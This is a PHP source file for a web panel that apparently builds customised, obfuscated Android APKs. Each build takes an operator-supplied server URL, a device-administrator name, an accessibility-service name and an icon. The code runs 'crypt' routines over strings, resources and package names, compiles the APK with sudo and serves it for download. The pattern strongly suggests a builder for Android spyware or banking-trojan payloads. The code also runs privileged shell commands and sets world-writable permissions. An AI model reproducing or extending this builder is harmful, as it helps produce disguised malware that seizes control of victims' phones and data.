<?php 
class build{

    function showFrontendHTML(){
        $id_user = md5($_SESSION['key_log']);//"id_user";
        include 'utilsDir.php';
        $utilsDir = new utilsDir();
        $getHTML = file_get_contents("1.html");
       
        return str_replace("<!---SET-DATA-TABLES--->", $utilsDir -> frontendTables($id_user), $getHTML);
    }

    function backend(){
        $id_user = md5($_SESSION['key_log']);//"id_user";
        if($_SERVER['REQUEST_METHOD'] == 'GET') {
            if($_GET['download']){
                $arrayFilter = array(".","/","script","'",":",";","+");
                $nameFile = base64_decode($_GET['download']);
                foreach($arrayFilter as $r){
                    $nameFile = str_replace("$r","",$nameFile);
                }
                $this -> file_force_download("/sysbig/buildFile/$id_user/$nameFile.apk");
                header("Refresh: 0; ?");
            }

            if($_GET['deletefiles']){
                system('sudo rm -r /sysbig/buildFile/'.$id_user.'/');
                header("Refresh: 0; ?");
            }
        }

        if($_SERVER['REQUEST_METHOD'] == 'POST') {
if(!empty($_POST['url'])){
            $url = $_POST['url']; 
            $name_app = $_POST['name_app']; 
            $name_admin = $_POST['name_admin']; 
            $name_accessibility = $_POST['name_accessibility']; 
            $steps = $_POST['steps']; 
            $tag = $_POST['tag']; 
            $key = $_POST['key']; 
            $file_get_contents_base64 = "";
            $debug = ($_POST['debug']=='on')?'1':'0'; 
            $testing = ($_POST['testing']=='on')?'1':'0'; 
            $crypt =  '0';//($_POST['crypt']=='on')?'1':'0'; 

            if($testing == '1'){
                $name_app = 'Testing Mode';
                $tag = 'Testing Mode';
                $name_admin = 'Testing Mode';
                $name_accessibility ='Testing Mode';
            }
           
            if($_FILES){
                if((substr($_FILES['upload_file']['name'], strlen($_FILES['upload_file']['name'])-4,4)==".png") && 
                    ($_FILES['upload_file']['type'] == 'image/png' )){
                        $file_get_contents_base64 =  $this->pngtoBase64($_FILES['upload_file']['tmp_name']);
                }
            }

            //Build APK 
          
            $this -> start($id_user,
                           $url,
                           $name_app,
                           $name_admin,
                           $name_accessibility,
                           $steps,
                           $tag,
                           $key,
                           $file_get_contents_base64,
                           $debug,
                           $testing,
                           $crypt);
        }

        }
    }

    function main(){
        echo $this -> showFrontendHTML();
        $this -> backend();
    }

    function start($id_user,
    $url,
    $name_app,
    $nameAdminDevice,
    $nameAccessibilityService,
    $steps,
    $tag,
    $key,
    $fileIconBase64,
    $debug,
    $testing,
    $miniCrypt){
        include 'crypt.php';
        include 'utils.php';
       
        $utils = new utils();

        //----Params-----        
       /* $id_user  = "id_user"; // String
        $url = "http://url.com"; // String
        $name_app = "name_mmm"; // String
        $key = "start"; // String
        $tag = "tag";  // String
        $nameAccessibilityService = "Android Service"; // String
        $steps = "5"; // int(String)
        $nameAdminDevice = "ADDMIN"; // String
        $fileIconBase64 = $utils -> pngtoBase64("-.png"); // upload file String -> base64
        $miniCrypt = "";*/
        //----------------

        system("sudo rm -R /sysbig/tmpfile/$id_user");
        system("sudo mkdir /sysbig/tmpfile/$id_user");
        system("sudo cp -r /sysbig/sourceproject/mmm /sysbig/tmpfile/$id_user/mmm");
        system("sudo chmod -R 777 /sysbig/tmpfile/$id_user");

        $utils -> replaceStringProject($id_user, $url, $name_app, $key, $tag, $nameAccessibilityService, $steps, $nameAdminDevice, $debug, $testing, $miniCrypt);
        $utils -> cryptString($id_user); // - 1
        $utils -> replaceAllFolder($id_user); // - 2
        $utils -> replaceNameFileJavaClass($id_user); // - 3
        $utils -> cryptRes($id_user); // - 4
        $utils -> createKey($id_user);
        $utils -> createIcon($id_user,$fileIconBase64);
        $utils -> cryptPackage($id_user);

       
       
        exec("cd /sysbig/tmpfile/$id_user/mmm/ && sudo ./gradlew assembleRelease");
        
        $indexAPK = count($utils -> getFiles('/sysbig/buildFile/'.$id_user.'/')) + 1;
        system("sudo mkdir /sysbig/buildFile/$id_user");
        system("sudo cp -r /sysbig/tmpfile/$id_user/mmm/app/build/outputs/apk/release/app-release.apk /sysbig/buildFile/$id_user/app-release-".$indexAPK.".apk");
        system("sudo chmod -R 777 /sysbig/buildFile/$id_user");  

        echo "<script>alert('New File app-release-$indexAPK.apk')</script>";
        header('refresh: 1');
    }
    function pngtoBase64($path){
		$type = pathinfo($path, PATHINFO_EXTENSION);
		$data = file_get_contents($path);
		return 'data:image/png;base64,' . base64_encode($data);
    }

    function file_force_download($file) {
        
        if (file_exists($file)) {
          if (ob_get_level()) {
            ob_end_clean();
          }
         
	      header('Content-Description: File Transfer');
          header('Content-Type: application/octet-stream');
          header('Content-Disposition: attachment; filename=' . basename($file));
          header('Content-Transfer-Encoding: binary');
          header('Expires: 0');
          header('Cache-Control: must-revalidate');
          header('Pragma: public');
          header('Content-Length: ' . filesize($file));
	

          readfile($file);
          exit;
        }
      }
}
